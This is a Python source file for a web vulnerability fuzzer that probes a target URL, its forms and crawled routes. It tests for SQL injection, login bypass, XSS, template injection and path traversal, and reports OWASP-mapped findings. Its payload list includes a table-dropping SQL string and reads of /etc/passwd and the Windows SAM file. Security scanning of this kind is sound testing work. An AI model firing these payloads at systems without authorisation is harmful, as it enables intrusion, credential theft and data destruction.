"""SQL injection fuzzer - tests multiple injection points and detection patterns."""
import requests
from urllib.parse import urlparse, urlencode
from classifiers.owasp_mapper import OWASPMapper
from scanners.scanner_utils import discover_attack_surface

# Expanded payloads
PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' UNION SELECT NULL,NULL,NULL--",
    "1; DROP TABLE users--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "1' ORDER BY 100--",
    "<script>alert('xss')</script>",
    '"><img src=x onerror=alert(1)>',
    "{{7*7}}",
    "${7*7}",
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
]

# Error patterns indicating SQL injection
SQL_ERROR_PATTERNS = [
    'sql syntax', 'mysql_fetch', 'pg_query', 'sqlite_', 'sqlite3.',
    'unclosed quotation', 'ora-', 'microsoft ole db', 'odbc sql',
    'sqlstate', 'pdo exception', 'syntax error', 'unterminated string',
    'sql server', 'jdbc', 'hibernate', 'sequelize', 'typeorm',
    'knex', 'prisma', 'query error', 'database error',
]

# XSS reflection patterns
XSS_PATTERNS = ['<script>alert', 'onerror=alert', '<img src=x']

# Template injection patterns
SSTI_PATTERNS = ['49']  # 7*7 = 49

# Path traversal patterns
PATH_PATTERNS = ['root:', '[boot loader]', 'sam', '/etc/passwd']

def fuzz_sqli(url):
    findings = []
    surface = discover_attack_surface(url)
    found_sqli = False
    found_xss = False
    found_ssti = False
    found_path = False
    found_auth_bypass = False

    for payload in PAYLOADS:
        try:
            # Test via query parameter
            res = requests.get(url, params={"q": payload, "id": payload, "search": payload}, timeout=5)
            text = res.text.lower()

            # SQL Injection
            if not found_sqli and any(p in text for p in SQL_ERROR_PATTERNS):
                findings.append(OWASPMapper.map_finding(
                    'A03',
                    'SQL Injection Vulnerability',
                    'The application returned database error messages when injected with a SQL payload. User input is not properly sanitised before database queries.',
                    f'Payload: {payload}'
                ))
                found_sqli = True

            # Reflected XSS
            if not found_xss and any(p in text for p in XSS_PATTERNS):
                findings.append(OWASPMapper.map_finding(
                    'A03',
                    'Reflected Cross-Site Scripting (XSS)',
                    'User-supplied script content is reflected back in the HTML response without sanitisation.',
                    f'Payload: {payload}'
                ))
                found_xss = True

            # Template injection
            if not found_ssti and '49' in text and ('{{7*7}}' in payload or '${7*7}' in payload):
                findings.append(OWASPMapper.map_finding(
                    'A03',
                    'Server-Side Template Injection (SSTI)',
                    'The server evaluates template expressions from user input, enabling remote code execution.',
                    f'Payload: {payload} -> Response contained "49"'
                ))
                found_ssti = True

            # Path traversal
            if not found_path and any(p in text for p in PATH_PATTERNS):
                findings.append(OWASPMapper.map_finding(
                    'A01',
                    'Path Traversal / Local File Inclusion',
                    'The application allows reading arbitrary files from the server filesystem.',
                    f'Payload: {payload}'
                ))
                found_path = True

        except Exception:
            pass

    candidate_forms = surface["forms"] or [{"url": url, "method": "POST", "inputs": ["username", "password", "q"]}]
    for form in candidate_forms:
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs") or ["username", "password", "q", "id", "search"]
        for payload in PAYLOADS[:6]:
            try:
                data = {name: payload for name in inputs}
                if "password" in inputs:
                    data["password"] = payload
                if "username" in inputs:
                    data["username"] = payload

                if method == "GET":
                    res = surface["session"].get(form["url"], params=data, timeout=5, allow_redirects=True)
                else:
                    res = surface["session"].post(form["url"], data=data, timeout=5, allow_redirects=True)
                text = res.text.lower()

                if not found_sqli and any(p in text for p in SQL_ERROR_PATTERNS):
                    findings.append(OWASPMapper.map_finding(
                        'A03',
                        'SQL Injection via Form Parameters',
                        'A discovered form returned database error messages when submitted with SQL payloads.',
                        f'{method} {form["url"]} payload: {payload}'
                    ))
                    found_sqli = True

                success_markers = ['logout', 'company workspace', 'dashboard', 'welcome', 'vault artifact', 'employee vault']
                failure_markers = ['invalid', 'login failed', 'access denied']
                if (
                    not found_auth_bypass
                    and any(name in inputs for name in ['username', 'password'])
                    and any(marker in text for marker in success_markers)
                    and not any(marker in text for marker in failure_markers)
                ):
                    findings.append(OWASPMapper.map_finding(
                        'A03',
                        'SQL Injection Authentication Bypass',
                        'A login form accepted a SQL injection payload and returned authenticated content.',
                        f'{method} {form["url"]} payload: {payload}'
                    ))
                    found_auth_bypass = True
            except Exception:
                pass

    for target in surface["urls"][:60]:
        for payload in PAYLOADS[:4]:
            try:
                res = surface["session"].get(target, params={"id": payload, "q": payload, "search": payload}, timeout=5)
                text = res.text.lower()
                if not found_sqli and any(p in text for p in SQL_ERROR_PATTERNS):
                    findings.append(OWASPMapper.map_finding(
                        'A03',
                        'SQL Injection via Discovered Route',
                        'A discovered route returned database error messages when query parameters were fuzzed.',
                        f'GET {target} payload: {payload}'
                    ))
                    found_sqli = True
            except Exception:
                pass

    return findings
